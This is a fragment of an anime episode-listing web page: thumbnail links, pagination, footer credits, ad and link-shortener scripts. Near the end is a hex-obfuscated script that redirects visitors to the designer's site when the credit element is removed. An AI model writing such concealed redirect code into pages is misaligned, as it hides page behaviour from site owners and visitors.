                                <img src="http://animekb.com/wp-content/uploads/2018/03/cardcaptor-sakura-clear-card-hen-episodio-11.jpg" class="cover"/>
                            </figure>
                        </a>
                    </div>
                </article>
                            <article class='post hentry'>
                    <div class='post-thumbnail'>
                        <a href='http://animekb.com/poputepipikku-11/' itemprop='image' title='Poputepipikku 11'>
                            <header class="header-osc">
                                <h2 class="entry-title" itemprop="name">Poputepipikku 11</h2>                            </header>
                            <figure class="figure-img">
                                <img src="http://animekb.com/wp-content/uploads/2018/03/poputepipikku-episodio-11.jpg" class="cover"/>
                            </figure>
                        </a>
                    </div>
                </article>
                            <article class='post hentry'>
                    <div class='post-thumbnail'>
                        <a href='http://animekb.com/mahoutsukai-no-yome-23/' itemprop='image' title='Mahoutsukai no Yome 23'>
                            <header class="header-osc">
                                <h2 class="entry-title" itemprop="name">Mahoutsukai no Yome 23</h2>                            </header>
                            <figure class="figure-img">
                                <img src="http://animekb.com/wp-content/uploads/2018/03/mahoutsukai-no-yome-episodio-23.jpg" class="cover"/>
                            </figure>
                        </a>
                    </div>
                </article>
                            <article class='post hentry'>
                    <div class='post-thumbnail'>
                        <a href='http://animekb.com/slow-start-11/' itemprop='image' title='Slow Start 11'>
                            <header class="header-osc">
                                <h2 class="entry-title" itemprop="name">Slow Start 11</h2>                            </header>
                            <figure class="figure-img">
                                <img src="http://animekb.com/wp-content/uploads/2018/03/slow-start-episodio-11.jpg" class="cover"/>
                            </figure>
                        </a>
                    </div>
                </article>
                            <article class='post hentry'>
                    <div class='post-thumbnail'>
                        <a href='http://animekb.com/3-gatsu-no-lion-2nd-season-19/' itemprop='image' title='3-gatsu no Lion 2nd Season 19'>
                            <header class="header-osc">
                                <h2 class="entry-title" itemprop="name">3-gatsu no Lion 2nd Season 19</h2>                            </header>
                            <figure class="figure-img">
                                <img src="http://animekb.com/wp-content/uploads/2018/03/3-gatsu-no-lion-2nd-season-episodio-19.jpg" class="cover"/>
                            </figure>
                        </a>
                    </div>
                </article>
                            <article class='post hentry'>
                    <div class='post-thumbnail'>
                        <a href='http://animekb.com/darling-in-the-franxx-10/' itemprop='image' title='Darling in the FranXX 10'>
                            <header class="header-osc">
                                <h2 class="entry-title" itemprop="name">Darling in the FranXX 10</h2>                            </header>
                            <figure class="figure-img">
                                <img src="http://animekb.com/wp-content/uploads/2018/03/darling-in-the-franxx-episodio-10.jpg" class="cover"/>
                            </figure>
                        </a>
                    </div>
                </article>
                            <article class='post hentry'>
                    <div class='post-thumbnail'>
                        <a href='http://animekb.com/citrus-11/' itemprop='image' title='Citrus 11'>
                            <header class="header-osc">
                                <h2 class="entry-title" itemprop="name">Citrus 11</h2>                            </header>
                            <figure class="figure-img">
                                <img src="http://animekb.com/wp-content/uploads/2018/03/citrus-episodio-11.jpg" class="cover"/>
                            </figure>
                        </a>
                    </div>
                </article>
                                <div class='clear'></div></div> 
                    <div class="blog-pager" id="blog-pager">
                        <div class="pagenavi">
<span class="pages">Página 1 de 244:</span><span class="current">1</span><a href="http://animekb.com/page/2/" class="single_page" title="2">2</a><a href="http://animekb.com/page/3/" class="single_page" title="3">3</a><a href="http://animekb.com/page/4/" class="single_page" title="4">4</a><a href="http://animekb.com/page/5/" class="single_page" title="5">5</a><span class="expand">...</span><a href="http://animekb.com/page/244/" class="last" title="Última">244</a><a href="http://animekb.com/page/2/" >Siguiente &raquo;</a></div>
                    </div>
                    <div class='clear'></div></div>
                    <div class='clear'></div>
                    <div class='clear'></div>
                    <div class='clear'></div>
                    </div></div>
                    </div>
<!-- BEGIN CPMSTAR TWO-SIDED ASYNCHRONOUS SITESKIN CODE 20130626 -->
<script type="text/javascript">
var cpmstar_siteskin_settings = {
pid: 72057, //your poolid
centerWidth: '990', //distance IN PIXELS of ad from left side of page, e.g. "800px"
fixed: '1', //fix ads near top of screen: "0" to allow ads to scroll with page
topPos: '0px', //optionally shift the ad down from top of page
zIndex: 100 //adjust layering of ad vs. other page elements
};
(function(){var t=document.createElement('script');t.type='text/javascript';t.async=1;t.src=(document.location.protocol == "https:"?"//server":"//cdn") + ".cpmstar.com/cached/js/siteskin_v100.pack.js";var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(t,s);})();
</script>
<!-- END CPMSTAR SITESKIN CODE -->

<script type="text/javascript">
    var ouo_token = '5kqeDdWW';
    var exclude_domains = ['animekb.com', 'animechou.com', 'cpmstar.com', 'yourupload.com', 'animeid.tv']; 
</script>
<script src="http://animekb.com/wp-includes/js/full-page-script.js"></script>

    <div class='clear'></div>
    <div id='pagination'></div>
    </div><!-- END CONTENT -->
    <div class='clear'></div>
    <footer id='footer-wrapper' role='contentinfo'>
        <div class='creditanimekb'>
            <p class='fleft'>&#169; 2015-2017 <a href='http://www.animekb.com/'><span itemprop='name'>AnimeKB</span></a> - Ningún video se encuentra alojado en nuestros servidores</p>
            <style>
            .fb-like-fb {
            float: right;
            right: 22px;
            }
            </style>
            <div class='fb-like-fb'>
                <!--Facebook-->
                <div class="fb-like" data-href="https://www.facebook.com/AnimeKB.net/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
            </div>
            <div class='clear'></div>
            <p style="font-style:italic;">Hecho por: <span id='lightcredits'></span><a href="https://www.abrahammoca.com" target="_blank" title="Abraham Morales" rel="nofollow">Abraham Morales</a></span>
</p>
        </div>
        <div class='clear'></div>
    </footer>
<script src='//ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js'></script>
<script type='text/javascript'>
//<![CDATA[
var _0xa908=["\x73","\x72\x65\x70\x6C\x61\x63\x65","\x73\x72\x63","\x61\x74\x74\x72","\x77\x69\x64\x74\x68","\x31\x30\x30\x25","\x68\x65\x69\x67\x68\x74","\x61\x75\x74\x6F","\x65\x61\x63\x68","\x69\x6D\x67","\x66\x69\x6E\x64","\x23\x50\x6F\x70\x75\x6C\x61\x72\x50\x6F\x73\x74\x73\x31\x2C\x2E\x72\x65\x63\x65\x6E\x74\x5F\x70\x6F\x73\x74\x73\x5F\x61\x72\x6C\x69\x6E\x61","\x72\x65\x61\x64\x79","\x73\x63\x72\x65\x65\x6E\x20\x61\x6E\x64\x20\x28\x6D\x69\x6E\x2D\x77\x69\x64\x74\x68\x3A\x20\x36\x30\x65\x6D\x29","\x6D\x61\x74\x63\x68\x4D\x65\x64\x69\x61","\x6D\x61\x74\x63\x68\x65\x73","\x6F\x6E\x6C\x6F\x61\x64","\x6C\x69\x67\x68\x74\x63\x72\x65\x64\x69\x74\x73","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3a\x2f\x2f\x70\x6f\x72\x74\x61\x66\x6f\x6c\x69\x6f\x2e\x61\x62\x72\x61\x68\x61\x6d\x6d\x6f\x63\x61\x2e\x63\x6f\x6d\x0d\x0a","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x72\x65\x6C","\x6E\x6F\x66\x6F\x6C\x6C\x6F\x77","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3c\x61\x20\x68\x72\x65\x66\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x70\x6f\x72\x74\x61\x66\x6f\x6c\x69\x6f\x2e\x61\x62\x72\x61\x68\x61\x6d\x6d\x6f\x63\x61\x2e\x63\x6f\x6d\x22\x20\x74\x61\x72\x67\x65\x74\x3d\   x22\x5f\x62\x6c\x61\x6e\x6b\x22\x20\x74\x69\x74\x6c\x65\x3d\x22\x41\x62\x72\x61\x68\x61\x6d\x20\x4d\x6f\x72\x61\x6c\x65\x73\x22\x20\x72\x65\x6c\x3d\x22\x6e\x6f\x66\x6f\x6c\x6c\x6f\x77\x22\x3e\x41\x62\x72\x61\x68\x61\x6d\x20\x4d\x6f\x72\x61\x6c\x65\x73\x3c\x2f\x61\x3e"];$(document)[_0xa908[12]](function(){var _0x5fbex1=90;$(_0xa908[11])[_0xa908[10]](_0xa908[9])[_0xa908[8]](function(_0x5fbex2,_0x5fbex3){var _0x5fbex3=$(_0x5fbex3);_0x5fbex3[_0xa908[3]]({src:_0x5fbex3[_0xa908[3]](_0xa908[2])[_0xa908[1]](/s\B\d{2,4}/,_0xa908[0]+ _0x5fbex1)}),_0x5fbex3[_0xa908[3]](_0xa908[4],_0xa908[5]),_0x5fbex3[_0xa908[3]](_0xa908[6],_0xa908[7])})});(window[_0xa908[16]]= function(){var _0x5fbex5=document[_0xa908[18]](_0xa908[17]);null== _0x5fbex5&& (window[_0xa908[20]][_0xa908[19]]= _0xa908[21]),_0x5fbex5[_0xa908[22]](_0xa908[19],_0xa908[21]),_0x5fbex5[_0xa908[22]](_0xa908[23],_0xa908[24])})
//]]>
</script>
<script type='text/javascript' src='http://animekb.com/wp-includes/js/wp-embed.min.js?ver=4.9.4'></script>
    

</body>
</html>